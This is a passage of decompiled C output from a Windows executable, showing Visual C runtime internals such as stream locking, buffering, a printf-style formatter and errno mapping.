      } while (uVar10 < *puVar3);
    }
  }
  return 1;
}




undefined ** FUN_140008850(void)

{
  return &PTR_DAT_14001a110;
}




undefined8 FUN_140008860(void)

{
  longlong lVar1;
  undefined **ppuVar2;
  longlong lVar3;
  undefined4 *puVar4;
  longlong lVar5;
  
  lVar3 = 0x14;
  if (DAT_14001d720 == 0) {
    DAT_14001d720 = 0x200;
  }
  else if (DAT_14001d720 < 0x14) {
    DAT_14001d720 = 0x14;
  }
  DAT_14001c718 = FUN_14000f670((longlong)DAT_14001d720,8);
  if (DAT_14001c718 == 0) {
    DAT_14001d720 = 0x14;
    DAT_14001c718 = FUN_14000f670(0x14,8);
    if (DAT_14001c718 == 0) {
      return 0x1a;
    }
  }
  lVar5 = 0;
  ppuVar2 = &PTR_DAT_14001a110;
  lVar1 = lVar5;
  do {
    *(undefined ***)(lVar1 + DAT_14001c718) = ppuVar2;
    lVar1 = lVar1 + 8;
    ppuVar2 = ppuVar2 + 6;
    lVar3 = lVar3 + -1;
  } while (lVar3 != 0);
  puVar4 = &DAT_14001a12c;
  lVar3 = 3;
  do {
    lVar1 = *(longlong *)((&DAT_14001c4e0)[lVar5 >> 5] + (ulonglong)((uint)lVar5 & 0x1f) * 0x50);
    if (((lVar1 == -1) || (lVar1 == -2)) || (lVar1 == 0)) {
      *puVar4 = 0xfffffffe;
    }
    lVar5 = lVar5 + 1;
    puVar4 = puVar4 + 0xc;
    lVar3 = lVar3 + -1;
  } while (lVar3 != 0);
  return 0;
}




void FUN_140008960(void)

{
  FUN_14000fb10();
  if (DAT_14001bc64 != '\0') {
    FUN_14000f790();
  }
  FUN_14000b9c0(DAT_14001c718);
  return;
}




void FUN_140008990(ulonglong param_1)

{
  if ((0x14001a10f < param_1) && (param_1 < 0x14001a4a1)) {
    _lock((int)((longlong)(param_1 - 0x14001a110) / 0x30) + 0x10);
    *(uint *)(param_1 + 0x18) = *(uint *)(param_1 + 0x18) | 0x8000;
    return;
  }
                    /* WARNING: Could not recover jumptable at 0x0001400089ee. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  EnterCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x30));
  return;
}




void FUN_140008a00(int param_1,longlong param_2)

{
  if (param_1 < 0x14) {
    _lock(param_1 + 0x10);
    *(uint *)(param_2 + 0x18) = *(uint *)(param_2 + 0x18) | 0x8000;
    return;
  }
                    /* WARNING: Could not recover jumptable at 0x000140008a2c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  EnterCriticalSection((LPCRITICAL_SECTION)(param_2 + 0x30));
  return;
}




void FUN_140008a40(ulonglong param_1)

{
  if ((0x14001a10f < param_1) && (param_1 < 0x14001a4a1)) {
    *(uint *)(param_1 + 0x18) = *(uint *)(param_1 + 0x18) & 0xffff7fff;
    FUN_14000fc60((int)((longlong)(param_1 - 0x14001a110) / 0x30) + 0x10);
    return;
  }
                    /* WARNING: Could not recover jumptable at 0x000140008a87. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  LeaveCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x30));
  return;
}




void FUN_140008a90(int param_1,longlong param_2)

{
  if (param_1 < 0x14) {
    *(uint *)(param_2 + 0x18) = *(uint *)(param_2 + 0x18) & 0xffff7fff;
    FUN_14000fc60(param_1 + 0x10);
    return;
  }
                    /* WARNING: Could not recover jumptable at 0x000140008aa8. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  LeaveCriticalSection((LPCRITICAL_SECTION)(param_2 + 0x30));
  return;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 FUN_140008ab0(undefined **param_1)

{
  undefined *puVar1;
  byte bVar2;
  uint uVar3;
  int iVar4;
  undefined7 extraout_var;
  undefined **ppuVar5;
  longlong lVar6;
  
  uVar3 = FUN_14000fe60((longlong)param_1);
  bVar2 = FUN_14000fde0(uVar3);
  if ((int)CONCAT71(extraout_var,bVar2) == 0) {
    return 0;
  }
  ppuVar5 = FUN_140008850();
  if (param_1 == ppuVar5 + 6) {
    iVar4 = 0;
  }
  else {
    ppuVar5 = FUN_140008850();
    if (param_1 != ppuVar5 + 0xc) {
      return 0;
    }
    iVar4 = 1;
  }
  _DAT_14001bbc0 = _DAT_14001bbc0 + 1;
  if (((ulonglong)param_1[3] & 0x10c) != 0) {
    return 0;
  }
  if ((&DAT_14001bbc8)[iVar4] == 0) {
    lVar6 = FUN_14000f600(0x1000);
    (&DAT_14001bbc8)[iVar4] = lVar6;
    if (lVar6 == 0) {
      *(undefined4 *)((longlong)param_1 + 0x24) = 2;
      *(undefined4 *)(param_1 + 1) = 2;
      param_1[2] = (undefined *)(param_1 + 4);
      *param_1 = (undefined *)(param_1 + 4);
      goto LAB_140008b68;
    }
  }
  puVar1 = (undefined *)(&DAT_14001bbc8)[iVar4];
  *(undefined4 *)((longlong)param_1 + 0x24) = 0x1000;
  *(undefined4 *)(param_1 + 1) = 0x1000;
  param_1[2] = puVar1;
  *param_1 = puVar1;
LAB_140008b68:
  *(uint *)(param_1 + 3) = *(uint *)(param_1 + 3) | 0x1102;
  return 1;
}




/* Library Function - Single Match
    _ftbuf
   
   Library: Visual Studio 2005 Release */

void __cdecl _ftbuf(int _Flag,FILE *_File)

{
  if ((_Flag != 0) && (((uint)_File->_flag >> 0xc & 1) != 0)) {
    FUN_14000f880((int *)_File);
    _File->_flag = _File->_flag & 0xffffeeff;
    _File->_bufsiz = 0;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
  }
  return;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_140008bd0(FILE *param_1,byte *param_2,longlong *param_3,WCHAR *param_4)

{
  int *piVar1;
  byte bVar2;
  short *psVar3;
  uint *puVar4;
  WCHAR WVar5;
  char cVar6;
  ushort uVar7;
  int iVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  int iVar12;
  DWORD *pDVar13;
  undefined *puVar14;
  undefined6 extraout_var_00;
  undefined7 extraout_var;
  code *pcVar15;
  ulonglong uVar16;
  longlong lVar17;
  undefined *puVar18;
  WCHAR *pWVar19;
  WCHAR *pWVar20;
  byte *pbVar21;
  byte bVar22;
  uint uVar23;
  int iVar24;
  bool bVar25;
  undefined1 auStackY_318 [32];
  uint local_2d8;
  uint local_2d4;
  uint local_2d0;
  int local_2cc;
  int local_2c8;
  uint local_2c4;
  byte local_2c0;
  char local_2bf;
  WCHAR *local_2b8;
  int local_2b0;
  int local_2ac;
  int local_2a8;
  undefined4 local_2a4;
  pthreadlocinfo local_2a0;
  pthreadmbcinfo local_298;
  DWORD *local_290;
  char local_288;
  undefined4 local_280;
  WCHAR *local_278;
  int local_270 [2];
  WCHAR *local_268;
  byte *local_260;
  ulonglong local_258 [63];
  undefined1 local_59 [9];
  ulonglong local_50;
  
  local_50 = DAT_14001a0b0 ^ (ulonglong)auStackY_318;
  uVar11 = 0;
  local_2a4 = 0;
  local_2d8 = 0;
  local_2b0 = 0;
  local_2d0 = 0;
  local_2c4 = 0;
  local_2a8 = 0;
  local_2cc = 0;
  local_288 = '\0';
  local_2b8 = param_4;
  if (param_3 == (longlong *)0x0) {
    local_290 = FUN_14000b3d0();
    local_2a0 = *(pthreadlocinfo *)(local_290 + 0x30);
    local_298 = *(pthreadmbcinfo *)(local_290 + 0x2e);
    if ((local_2a0 != (pthreadlocinfo)PTR_DAT_14001ad00) &&
       ((_DAT_14001ab88 & local_290[0x32]) == 0)) {
      local_2a0 = __updatetlocinfo();
    }
    if ((local_298 != (pthreadmbcinfo)PTR_DAT_14001aa80) &&
       ((_DAT_14001ab88 & local_290[0x32]) == 0)) {
      local_298 = __updatetmbcinfo();
    }
    if ((local_290[0x32] & 2) == 0) {
      local_290[0x32] = local_290[0x32] | 2;
      local_288 = '\x01';
    }
  }
  else {
    local_2a0 = (pthreadlocinfo)*param_3;
    local_298 = (pthreadmbcinfo)param_3[1];
  }
  if (param_1 == (FILE *)0x0) {
    pDVar13 = FUN_140009c00();
    *pDVar13 = 0x16;
    FUN_1400072d0(0,0,0,0,0);
    if (local_288 != '\0') {
      local_290[0x32] = local_290[0x32] & 0xfffffffd;
    }
    goto LAB_140009af6;
  }
  if ((param_1->_flag & 0x40) == 0) {
    iVar8 = FUN_14000fe60((longlong)param_1);
    puVar18 = &DAT_14001af90;
    if ((iVar8 == -1) || (iVar8 = FUN_14000fe60((longlong)param_1), iVar8 == -2)) {
      puVar14 = &DAT_14001af90;
    }
    else {
      iVar8 = FUN_14000fe60((longlong)param_1);
      lVar17 = (&DAT_14001c4e0)[(longlong)iVar8 >> 5];
      uVar9 = FUN_14000fe60((longlong)param_1);
      puVar14 = (undefined *)((ulonglong)(uVar9 & 0x1f) * 0x50 + lVar17);
    }
    if ((puVar14[0x38] & 0x7f) == 0) {
      iVar8 = FUN_14000fe60((longlong)param_1);
      if ((iVar8 != -1) && (iVar8 = FUN_14000fe60((longlong)param_1), iVar8 != -2)) {
        iVar8 = FUN_14000fe60((longlong)param_1);
        lVar17 = (&DAT_14001c4e0)[(longlong)iVar8 >> 5];
        uVar9 = FUN_14000fe60((longlong)param_1);
        puVar18 = (undefined *)((ulonglong)(uVar9 & 0x1f) * 0x50 + lVar17);
      }
      param_4 = local_2b8;
      if ((puVar18[0x38] & 0x80) == 0) goto LAB_140008e33;
    }
    pDVar13 = FUN_140009c00();
    *pDVar13 = 0x16;
    FUN_1400072d0(0,0,0,0,0);
    bVar25 = local_288 == '\0';
  }
  else {
LAB_140008e33:
    if (param_2 != (byte *)0x0) {
      bVar22 = *param_2;
      local_2d4 = 0;
      local_2c8 = 0;
      local_278 = (WCHAR *)0x0;
      pWVar20 = local_268;
      iVar8 = 0;
      uVar23 = uVar11;
      uVar9 = uVar11;
      while (bVar22 != 0) {
        pbVar21 = param_2 + 1;
        local_260 = pbVar21;
        if ((int)uVar9 < 0) break;
        uVar10 = 0;
        if ((byte)(bVar22 - 0x20) < 0x59) {
          uVar10 = *(byte *)((longlong)L"(null)" + (longlong)(char)bVar22) & 0xf;
        }
        local_2ac = (int)(char)(&DAT_140015bd0)[(longlong)iVar8 + (longlong)(int)uVar10 * 8] >> 4;
        switch(local_2ac) {
        case 0:
switchD_140008f34_caseD_0:
          uVar10 = (uint)bVar22;
          local_2cc = 0;
          uVar7 = FUN_1400101b0((uint)bVar22,&local_2a0);
          if ((int)CONCAT62(extraout_var_00,uVar7) != 0) {
            if (((param_1->_flag & 0x40) == 0) || (param_1->_base != (char *)0x0)) {
              piVar1 = &param_1->_cnt;
              *piVar1 = *piVar1 + -1;
              if (*piVar1 < 0) {
                uVar16 = FUN_140009cf0((int)(char)bVar22,param_1);
                uVar10 = (uint)uVar16;
              }
              else {
                *param_1->_ptr = bVar22;
                param_1->_ptr = param_1->_ptr + 1;
              }
              if (uVar10 == 0xffffffff) {
                uVar9 = 0xffffffff;
              }
              else {
                uVar9 = uVar9 + 1;
              }
            }
            else {
              uVar9 = uVar9 + 1;
            }
            bVar22 = *pbVar21;
            pbVar21 = param_2 + 2;
            if (bVar22 == 0) {
LAB_140009a8a:
              pDVar13 = FUN_140009c00();
              *pDVar13 = 0x16;
              FUN_1400072d0(0,0,0,0,0);
              bVar25 = local_288 == '\0';
              goto LAB_140009ab5;
            }
          }
          if (((param_1->_flag & 0x40) == 0) || (param_1->_base != (char *)0x0)) {
            piVar1 = &param_1->_cnt;
            *piVar1 = *piVar1 + -1;
            if (*piVar1 < 0) {
              uVar16 = FUN_140009cf0((int)(char)bVar22,param_1);
              uVar10 = (uint)uVar16;
            }
            else {
              *param_1->_ptr = bVar22;
              param_1->_ptr = param_1->_ptr + 1;
              uVar10 = (uint)bVar22;
            }
            if (uVar10 == 0xffffffff) {
              local_2d4 = 0xffffffff;
              uVar9 = 0xffffffff;
            }
            else {
              local_2d4 = uVar9 + 1;
              uVar9 = local_2d4;
            }
          }
          else {
            local_2d4 = uVar9 + 1;
            uVar9 = local_2d4;
          }
          break;
        case 1:
          uVar11 = 0xffffffff;
          local_280 = 0;
          local_2a8 = 0;
          local_2b0 = 0;
          local_2c4 = 0;
          local_2d0 = 0xffffffff;
          local_2d8 = 0;
          local_2cc = 0;
          uVar23 = 0;
          break;
        case 2:
          if (bVar22 == 0x20) {
            local_2d8 = uVar23 | 2;
            uVar23 = local_2d8;
          }
          else if (bVar22 == 0x23) {
            local_2d8 = uVar23 | 0x80;
            uVar23 = local_2d8;
          }
          else if (bVar22 == 0x2b) {
            local_2d8 = uVar23 | 1;
            uVar23 = local_2d8;
          }
          else if (bVar22 == 0x2d) {
            local_2d8 = uVar23 | 4;
            uVar23 = local_2d8;
          }
          else if (bVar22 == 0x30) {
            local_2d8 = uVar23 | 8;
            uVar23 = local_2d8;
          }
          break;
        case 3:
          if (bVar22 == 0x2a) {
            local_2b0 = *(int *)param_4;
            local_2b8 = param_4 + 4;
            if (local_2b0 < 0) {
              local_2d8 = uVar23 | 4;
              local_2b0 = -local_2b0;
              uVar23 = local_2d8;
            }
          }
          else {
            local_2b0 = (char)bVar22 + -0x30 + local_2b0 * 10;
          }
          break;
        case 4:
          local_2d0 = 0;
          uVar11 = 0;
          break;
        case 5:
          if (bVar22 == 0x2a) {
            local_2d0 = *(uint *)param_4;
            local_2b8 = param_4 + 4;
            uVar11 = local_2d0;
            if ((int)local_2d0 < 0) {
              local_2d0 = 0xffffffff;
              uVar11 = 0xffffffff;
            }
          }
          else {
            local_2d0 = (char)bVar22 + -0x30 + uVar11 * 10;
            uVar11 = local_2d0;
          }
          break;
        case 6:
          if (bVar22 == 0x49) {
            bVar2 = *pbVar21;
            local_2d8 = uVar23 | 0x8000;
            if ((bVar2 == 0x36) && (param_2[2] == 0x34)) {
              local_2d8 = uVar23 | 0x8000;
              pbVar21 = param_2 + 3;
              uVar23 = local_2d8;
            }
            else if ((bVar2 == 0x33) && (param_2[2] == 0x32)) {
              local_2d8 = uVar23 & 0xffff7fff;
              pbVar21 = param_2 + 3;
              uVar23 = local_2d8;
            }
            else {
              uVar23 = local_2d8;
              if (((((bVar2 != 100) && (bVar2 != 0x69)) && (bVar2 != 0x6f)) &&
                  ((bVar2 != 0x75 && (bVar2 != 0x78)))) && (bVar2 != 0x58)) {
                local_2ac = 0;
                goto switchD_140008f34_caseD_0;
              }
            }
          }
          else if (bVar22 == 0x68) {
            local_2d8 = uVar23 | 0x20;
            uVar23 = local_2d8;
          }
          else if (bVar22 == 0x6c) {
            if (*pbVar21 == 0x6c) {
              local_2d8 = uVar23 | 0x1000;
              pbVar21 = param_2 + 2;
              uVar23 = local_2d8;
            }
            else {
              local_2d8 = uVar23 | 0x10;
              uVar23 = local_2d8;
            }
          }
          else if (bVar22 == 0x77) {
            local_2d8 = uVar23 | 0x800;
            uVar23 = local_2d8;
          }
          break;
        case 7:
          switch(bVar22) {
          case 0x41:
          case 0x45:
          case 0x47:
            local_280 = 1;
            bVar22 = bVar22 + 0x20;
          case 0x61:
          case 0x65:
          case 0x66:
          case 0x67:
            local_2d8 = uVar23 | 0x40;
            iVar8 = 0x200;
            pWVar20 = (WCHAR *)local_258;
            if ((int)uVar11 < 0) {
              uVar11 = 6;
              local_2d0 = 6;
              iVar24 = 0x200;
            }
            else {
              iVar24 = iVar8;
              if (uVar11 == 0) {
                if (bVar22 == 0x67) {
                  uVar11 = 1;
                  local_2d0 = 1;
                }
              }
              else {
                if ((int)uVar11 < 0x201) {
                  if ((int)uVar11 < 0xa4) goto LAB_1400094f1;
                }
                else {
                  uVar11 = 0x200;
                  local_2d0 = 0x200;
                }
                iVar24 = uVar11 + 0x15d;
                local_278 = (WCHAR *)FUN_14000f600((longlong)iVar24);
                pWVar20 = local_278;
                if (local_278 == (WCHAR *)0x0) {
                  uVar11 = 0xa3;
                  local_2d0 = 0xa3;
                  pWVar20 = (WCHAR *)local_258;
                  iVar24 = iVar8;
                }
              }
            }
LAB_1400094f1:
            local_268 = *(WCHAR **)local_2b8;
            local_2b8 = local_2b8 + 4;
            pcVar15 = (code *)FUN_14000b0e0((INT_PTR)PTR_LAB_14001b260);
            (*pcVar15)(&local_268,pWVar20,(longlong)iVar24);
            if (((uVar23 & 0x80) != 0) && (uVar11 == 0)) {
              pcVar15 = (code *)FUN_14000b0e0((INT_PTR)PTR_LAB_14001b278);
              (*pcVar15)(pWVar20,&local_2a0);
            }
            if ((bVar22 == 0x67) && ((uVar23 & 0x80) == 0)) {
              pcVar15 = (code *)FUN_14000b0e0((INT_PTR)PTR_LAB_14001b270);
              (*pcVar15)(pWVar20,&local_2a0);
            }
            if ((char)*pWVar20 == '-') {
              local_2d8 = uVar23 | 0x140;
              pWVar20 = (WCHAR *)((longlong)pWVar20 + 1);
            }
            lVar17 = -1;
            pWVar19 = pWVar20;
            do {
              if (lVar17 == 0) break;
              lVar17 = lVar17 + -1;
              WVar5 = *pWVar19;
              pWVar19 = (WCHAR *)((longlong)pWVar19 + 1);
            } while ((char)WVar5 != '\0');
            local_2c8 = ~(uint)lVar17 - 1;
            uVar23 = local_2d8;
            break;
          case 0x42:
          case 0x44:
          case 0x46:
          case 0x48:
          case 0x49:
          case 0x4a:
          case 0x4b:
          case 0x4c:
          case 0x4d:
          case 0x4e:
          case 0x4f:
          case 0x50:
          case 0x51:
          case 0x52:
          case 0x54:
          case 0x55:
          case 0x56:
          case 0x57:
          case 0x59:
          case 0x5b:
          case 0x5c:
          case 0x5d:
          case 0x5e:
          case 0x5f:
          case 0x60:
          case 0x62:
          case 0x68:
          case 0x6a:
          case 0x6b:
          case 0x6c:
          case 0x6d:
          case 0x71:
          case 0x72:
          case 0x74:
          case 0x76:
          case 0x77:
            break;
          case 0x43:
            if ((uVar23 & 0x830) == 0) {
              local_2d8 = uVar23 | 0x800;
              uVar23 = local_2d8;
            }
          case 99:
            if ((uVar23 & 0x810) == 0) {
              local_2b8 = param_4 + 4;
              local_2c8 = 1;
              local_258[0]._0_1_ = (char)*param_4;
            }
            else {
              local_2b8 = param_4 + 4;
              iVar8 = FUN_140010190(&local_2c8,local_258,0x200,*param_4);
              if (iVar8 != 0) {
                local_2a8 = 1;
                pWVar20 = (WCHAR *)local_258;
                break;
              }
            }
            pWVar20 = (WCHAR *)local_258;
            break;
          case 0x53:
            if ((uVar23 & 0x830) == 0) {
              local_2d8 = uVar23 | 0x800;
              uVar23 = local_2d8;
            }
          case 0x73:
            pWVar19 = *(WCHAR **)param_4;
            uVar10 = uVar11;
            if (uVar11 == 0xffffffff) {
              uVar10 = 0x7fffffff;
            }
            local_2b8 = param_4 + 4;
            if ((uVar23 & 0x810) == 0) {
              pWVar20 = pWVar19;
              if (pWVar19 == (WCHAR *)0x0) {
                pWVar19 = (WCHAR *)PTR_s__null__14001a4d0;
                pWVar20 = (WCHAR *)PTR_s__null__14001a4d0;
              }
              for (; (uVar10 != 0 && (uVar10 = uVar10 - 1, (char)*pWVar19 != '\0'));
                  pWVar19 = (WCHAR *)((longlong)pWVar19 + 1)) {
              }
              local_2c8 = (int)pWVar19 - (int)pWVar20;
            }
            else {
              if (pWVar19 == (WCHAR *)0x0) {
                pWVar19 = (WCHAR *)PTR_u__null__14001a4d8;
              }
              local_2cc = 1;
              for (pWVar20 = pWVar19; (uVar10 != 0 && (uVar10 = uVar10 - 1, *pWVar20 != L'\0'));
                  pWVar20 = pWVar20 + 1) {
              }
              local_2c8 = (int)((longlong)pWVar20 - (longlong)pWVar19 >> 1);
              pWVar20 = pWVar19;
            }
            break;
          case 0x58:
            goto switchD_140009278_caseD_58;
          case 0x5a:
            psVar3 = *(short **)param_4;
            local_2b8 = param_4 + 4;
            if ((psVar3 == (short *)0x0) ||
               (pWVar20 = *(WCHAR **)(psVar3 + 4), pWVar20 == (WCHAR *)0x0)) {
              lVar17 = -1;
              pWVar20 = (WCHAR *)PTR_s__null__14001a4d0;
              do {
                if (lVar17 == 0) break;
                lVar17 = lVar17 + -1;
                WVar5 = *pWVar20;
                pWVar20 = (WCHAR *)((longlong)pWVar20 + 1);
              } while ((char)WVar5 != '\0');
              local_2c8 = ~(uint)lVar17 - 1;
              pWVar20 = (WCHAR *)PTR_s__null__14001a4d0;
            }
            else if ((uVar23 >> 0xb & 1) == 0) {
              local_2c8 = (int)*psVar3;
              local_2cc = 0;
            }
            else {
              local_2cc = 1;
              local_2c8 = (int)*psVar3 / 2;
            }
            break;
          case 100:
          case 0x69:
            local_2d8 = uVar23 | 0x40;
            iVar8 = 10;
            uVar23 = local_2d8;
            goto LAB_140009649;
          case 0x6e:
            local_2b8 = param_4 + 4;
            puVar4 = *(uint **)param_4;
            bVar25 = FUN_140006280();
            if ((int)CONCAT71(extraout_var,bVar25) == 0) goto LAB_140009a8a;
            if ((uVar23 & 0x20) == 0) {
              *puVar4 = uVar9;
              local_2a8 = 1;
            }
            else {
              *(short *)puVar4 = (short)uVar9;
              local_2a8 = 1;
            }
            goto LAB_140009a15;
          case 0x6f:
            iVar8 = 8;
            if ((char)uVar23 < '\0') {
              local_2d8 = uVar23 | 0x200;
              uVar23 = local_2d8;
            }
            goto LAB_140009649;
          case 0x70:
            local_2d8 = uVar23 | 0x8000;
            uVar11 = 0x10;
            uVar23 = local_2d8;
switchD_140009278_caseD_58:
            cVar6 = '\a';
            local_2a4 = 7;
LAB_140009608:
            iVar8 = 0x10;
            if ((char)uVar23 < '\0') {
              local_2bf = cVar6 + 'Q';
              local_2c0 = 0x30;
              local_2c4 = 2;
            }
            goto LAB_140009649;
          case 0x75:
            iVar8 = 10;
LAB_140009649:
            if (uVar23 >> 0xf == 0) {
              if ((uVar23 >> 0xc & 1) == 0) {
                if ((uVar23 & 0x20) == 0) {
                  if ((uVar23 & 0x40) == 0) {
                    uVar16 = (ulonglong)*(uint *)param_4;
                  }
                  else {
                    uVar16 = (ulonglong)*(int *)param_4;
                  }
                }
                else if ((uVar23 & 0x40) == 0) {
                  uVar16 = (ulonglong)(ushort)*param_4;
                }
                else {
                  uVar16 = (ulonglong)*param_4;
                }
              }
              else {
                uVar16 = *(ulonglong *)param_4;
              }
            }
            else {
              uVar16 = *(ulonglong *)param_4;
            }
            local_2b8 = param_4 + 4;
            if (((uVar23 & 0x40) != 0) && ((longlong)uVar16 < 0)) {
              uVar16 = -uVar16;
              uVar23 = uVar23 | 0x100;
              local_2d8 = uVar23;
            }
            if ((uVar23 >> 0xf == 0) && ((uVar23 >> 0xc & 1) == 0)) {
              uVar16 = uVar16 & 0xffffffff;
            }
            if ((int)uVar11 < 0) {
              uVar11 = 1;
            }
            else {
              local_2d8 = uVar23 & 0xfffffff7;
              if (0x200 < (int)uVar11) {
                uVar11 = 0x200;
              }
            }
            pWVar19 = (WCHAR *)local_59;
            if (uVar16 == 0) {
              local_2c4 = 0;
            }
            while ((local_2d0 = uVar11 - 1, 0 < (int)uVar11 || (uVar16 != 0))) {
              uVar11 = (int)(uVar16 % (ulonglong)(longlong)iVar8) + 0x30;
              cVar6 = (char)uVar11;
              if (0x39 < uVar11) {
                cVar6 = cVar6 + (char)local_2a4;
              }
              *(char *)pWVar19 = cVar6;
              pWVar19 = (WCHAR *)((longlong)pWVar19 + -1);
              uVar16 = uVar16 / (ulonglong)(longlong)iVar8;
              uVar11 = local_2d0;
            }
            local_2c8 = (int)local_59 - (int)pWVar19;
            pWVar20 = (WCHAR *)((longlong)pWVar19 + 1);
            uVar11 = local_2d0;
            uVar23 = local_2d8;
            if (((local_2d8 >> 9 & 1) != 0) && ((local_2c8 == 0 || (*(char *)pWVar20 != '0')))) {
              local_2c8 = local_2c8 + 1;
              *(undefined1 *)pWVar19 = 0x30;
              pWVar20 = pWVar19;
            }
            break;
          case 0x78:
            cVar6 = '\'';
            local_2a4 = 0x27;
            goto LAB_140009608;
          }
          iVar8 = local_2cc;
          if (local_2a8 == 0) {
            if ((uVar23 & 0x40) != 0) {
              if ((uVar23 >> 8 & 1) == 0) {
                if ((uVar23 & 1) == 0) {
                  if ((uVar23 & 2) != 0) {
                    local_2c0 = 0x20;
                    local_2c4 = 1;
                  }
                }
                else {
                  local_2c0 = 0x2b;
                  local_2c4 = 1;
                }
              }
              else {
                local_2c0 = 0x2d;
                local_2c4 = 1;
              }
            }
            uVar11 = local_2c4;
            iVar24 = (local_2b0 - local_2c8) - local_2c4;
            if ((uVar23 & 0xc) == 0) {
              FUN_140010370(0x20,iVar24,param_1,(int *)&local_2d4);
            }
            FUN_140010400(&local_2c0,uVar11,param_1,(int *)&local_2d4);
            if (((uVar23 & 8) != 0) && ((uVar23 & 4) == 0)) {
              FUN_140010370(0x30,iVar24,param_1,(int *)&local_2d4);
            }
            if ((iVar8 == 0) ||
               (pWVar19 = pWVar20, iVar8 = local_2c8, uVar9 = local_2d4, local_2c8 < 1)) {
              FUN_140010400((byte *)pWVar20,local_2c8,param_1,(int *)&local_2d4);
              uVar9 = local_2d4;
            }
            else {
              do {
                iVar8 = iVar8 + -1;
                iVar12 = FUN_140010190(local_270,(ulonglong *)(local_59 + 1),6,*pWVar19);
                if ((iVar12 != 0) || (local_270[0] == 0)) {
                  uVar9 = 0xffffffff;
                  local_2d4 = 0xffffffff;
                  uVar11 = local_2d0;
                  goto LAB_140009a15;
                }
                pbVar21 = local_59 + 1;
                iVar12 = local_270[0];
                if (((param_1->_flag & 0x40) == 0) || (param_1->_base != (char *)0x0)) {
joined_r0x0001400098e3:
                  if (0 < iVar12) {
                    bVar22 = *pbVar21;
                    iVar12 = iVar12 + -1;
                    if (((param_1->_flag & 0x40) == 0) || (param_1->_base != (char *)0x0)) {
                      piVar1 = &param_1->_cnt;
                      *piVar1 = *piVar1 + -1;
                      if (*piVar1 < 0) {
                        uVar16 = FUN_140009cf0((int)(char)bVar22,param_1);
                        uVar11 = (uint)uVar16;
                      }
                      else {
                        *param_1->_ptr = bVar22;
                        param_1->_ptr = param_1->_ptr + 1;
                        uVar11 = (uint)bVar22;
                      }
                      if (uVar11 == 0xffffffff) {
                        local_2d4 = 0xffffffff;
                      }
                      else {
                        local_2d4 = uVar9 + 1;
                      }
                    }
                    else {
                      local_2d4 = uVar9 + 1;
                    }
                    uVar9 = local_2d4;
                    pbVar21 = pbVar21 + 1;
                    if (local_2d4 == 0xffffffff) {
                      pDVar13 = FUN_140009c00();
                      if (*pDVar13 != 0x2a) goto LAB_140009993;
                      if (((param_1->_flag & 0x40) == 0) || (param_1->_base != (char *)0x0)) {
                        piVar1 = &param_1->_cnt;
                        *piVar1 = *piVar1 + -1;
                        if (*piVar1 < 0) {
                          uVar16 = FUN_140009cf0(0x3f,param_1);
                          if ((int)uVar16 == -1) {
                            local_2d4 = 0xffffffff;
                            uVar9 = local_2d4;
                            goto joined_r0x0001400098e3;
                          }
                        }
                        else {
                          *param_1->_ptr = '?';
                          param_1->_ptr = param_1->_ptr + 1;
                        }
                        local_2d4 = 0;
                        uVar9 = local_2d4;
                        goto joined_r0x0001400098e3;
                      }
                      local_2d4 = 0;
                      uVar9 = local_2d4;
                    }
                    goto joined_r0x0001400098e3;
                  }
                }
                else {
                  local_2d4 = uVar9 + local_270[0];
                  uVar9 = local_2d4;
                }
LAB_140009993:
                pWVar19 = pWVar19 + 1;
                uVar23 = local_2d8;
              } while (iVar8 != 0);
            }
            uVar11 = local_2d0;
            if ((-1 < (int)uVar9) && ((uVar23 & 4) != 0)) {
              FUN_140010370(0x20,iVar24,param_1,(int *)&local_2d4);
              uVar11 = local_2d0;
              uVar9 = local_2d4;
            }
          }
LAB_140009a15:
          pbVar21 = local_260;
          uVar23 = local_2d8;
          if (local_278 != (WCHAR *)0x0) {
            FUN_14000b9c0(local_278);
            local_278 = (WCHAR *)0x0;
            pbVar21 = local_260;
          }
        }
        param_2 = pbVar21;
        param_4 = local_2b8;
        iVar8 = local_2ac;
        bVar22 = *pbVar21;
      }
      if (local_288 != '\0') {
        local_290[0x32] = local_290[0x32] & 0xfffffffd;
      }
      goto LAB_140009af6;
    }
    pDVar13 = FUN_140009c00();
    *pDVar13 = 0x16;
    FUN_1400072d0(0,0,0,0,0);
    bVar25 = local_288 == '\0';
  }
LAB_140009ab5:
  if (!bVar25) {
    local_290[0x32] = local_290[0x32] & 0xfffffffd;
  }
LAB_140009af6:
  __security_check_cookie(local_50 ^ (ulonglong)auStackY_318);
  return;
}




undefined4 FUN_140009bb0(int param_1)

{
  undefined4 uVar1;
  int *piVar2;
  uint uVar3;
  
  uVar3 = 0;
  piVar2 = &DAT_14001a4e0;
  do {
    if (param_1 == *piVar2) {
      return (&DAT_14001a4e4)[(longlong)(int)uVar3 * 2];
    }
    uVar3 = uVar3 + 1;
    piVar2 = piVar2 + 2;
  } while (uVar3 < 0x2d);
  if (param_1 - 0x13U < 0x12) {
    return 0xd;
  }
  uVar1 = 0x16;
  if (param_1 - 0xbcU < 0xf) {
    uVar1 = 8;
  }
  return uVar1;
}




DWORD * FUN_140009c00(void)

{
  DWORD *pDVar1;
  
  pDVar1 = FUN_14000b340();
  if (pDVar1 == (DWORD *)0x0) {
    return (DWORD *)&DAT_14001a648;
  }
  return pDVar1 + 4;
}




DWORD * FUN_140009c30(void)

{
  DWORD *pDVar1;
  
  pDVar1 = FUN_14000b340();
  if (pDVar1 == (DWORD *)0x0) {
    return &DAT_14001a64c;
  }
  return pDVar1 + 5;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* Library Function - Single Match
    _dosmaperr
   
   Library: Visual Studio 2005 Release */

void __cdecl _dosmaperr(ulong param_1)

{
  DWORD *pDVar1;
  ulong *puVar2;
  uint uVar3;
  DWORD DVar4;
  
  pDVar1 = FUN_14000b340();
  if (pDVar1 == (DWORD *)0x0) {
    pDVar1 = &DAT_14001a64c;
  }
  else {
    pDVar1 = pDVar1 + 5;
  }
  *pDVar1 = param_1;
  uVar3 = 0;
